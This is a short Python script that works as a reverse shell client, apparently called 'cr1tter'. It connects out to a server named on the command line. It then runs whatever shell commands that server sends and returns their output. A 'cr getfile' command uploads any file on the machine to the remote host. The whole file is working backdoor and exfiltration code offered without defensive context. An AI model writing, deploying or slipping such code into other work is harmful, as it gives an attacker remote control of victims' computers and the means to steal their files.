import socket
import os
import subprocess
import sys
import tqdm

SERVER_HOST = sys.argv[1]
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

def cr_SendFile(filename: str):
    filesize = os.path.getsize(filename)
    progress = tqdm.tqdm(range(filesize), desc=f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    s.send(f"{filename}{SEPARATOR}{filesize}".encode())
    with open(filename, "rb") as f:
        while True:
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                break
            s.sendall(bytes_read)
            progress.update(len(bytes_read))


s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd()
s.send(cwd.encode())

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    elif splited_command[0].lower() == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    elif splited_command[0].lower() == "cr":
        # cr1tter command

        if splited_command[1].lower() == "getfile":
            try:
                cr_SendFile(splited_command[2])
            except FileNotFoundError as e:
                output = str(e)
            else:
                output = ""

    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)

    if splited_command[0] != "cr":
        cwd = os.getcwd()
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())

s.close()